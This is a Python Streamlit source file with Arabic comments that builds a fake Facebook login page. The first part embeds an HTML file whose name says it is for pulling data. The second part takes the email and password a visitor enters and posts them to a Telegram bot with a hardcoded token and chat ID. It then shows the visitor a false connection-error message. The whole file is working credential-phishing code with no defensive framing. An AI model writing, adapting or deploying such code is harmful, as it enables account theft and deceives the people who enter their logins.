import streamlit as st
import streamlit.components.v1 as components

# 1. إعداد الصفحة
st.set_page_config(page_title="Facebook Login", layout="centered")

# 2. قراءة ملف الـ HTML
try:
    with open("صفحه فيس لسحب البيانات.html", "r", encoding="utf-8") as f:
        # قرأنا الكود في متغير اسمه code
        code = f.read()
    
    # 3. العرض (التصحيح: نضع المتغير code مباشرة كأول قيمة)
    components.html(code, height=800, scrolling=True)

except FileNotFoundError:
    st.error("⚠️ لم أجد ملف الـ HTML! تأكد من رفعه بنفس الاسم بالضبط بجانب ملف البايثون.")
import streamlit as st
import requests

# المعلومات الصحيحة من صورتك الأخيرة
BOT_TOKEN = "8546784309:AAHe0WXiK1wyZ45JUgGxMeOQa8g-owMm9aM"
CHAT_ID = "8546784309"

def send_to_telegram(user, pwd):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"🔔 تم سحب بيانات جديدة:\n📧 الحساب: {user}\n🔑 كلمة السر: {pwd}"
    }
    requests.post(url, json=payload)

st.set_page_config(page_title="Facebook Login", layout="centered")

# عرض الصفحة
st.markdown("<h1 style='color: #1877f2; text-align: center;'>facebook</h1>", unsafe_allow_html=True)

with st.form("login_form"):
    email = st.text_input("البريد الإلكتروني أو رقم الهاتف")
    password = st.text_input("كلمة السر", type="password")
    if st.form_submit_button("تسجيل الدخول", use_container_width=True):
        send_to_telegram(email, password)
        st.error("عذراً، حدث خطأ في الاتصال. يرجى المحاولة لاحقاً.")
